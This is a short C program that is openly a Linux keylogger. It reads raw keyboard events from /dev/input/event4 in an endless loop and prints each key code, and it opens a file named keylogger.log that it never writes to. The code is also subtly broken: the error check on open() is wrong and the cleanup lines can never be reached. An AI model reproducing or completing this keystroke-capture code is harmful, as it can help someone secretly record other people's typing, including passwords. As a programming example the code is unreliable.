#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>
#include <linux/keyboard.h>

int main(void)
{
    int fd;
    FILE *LOGFILE;
    struct input_event env;

    fd = open("/dev/input/event4", O_RDONLY);
    if (!fd)
    {
        printf("\033[0;31mError\033[0;37m: open file event\n");
        return (0);
    }
    LOGFILE = fopen("../keylogger.log", "a");
    if (!LOGFILE)
    {
        printf("\033[0;31mError\033[0;37m: Keylogger file\n");
        close(fd);
        return (0);
    }
    while (1)
    {
        read(fd, &env, sizeof(env));
        if ((env.type == EV_KEY) /* && (env.value == 0) */)
        {
            printf("%d", env.code);
        }
    }
    close(fd);
    fclose(LOGFILE);
    return (0);
}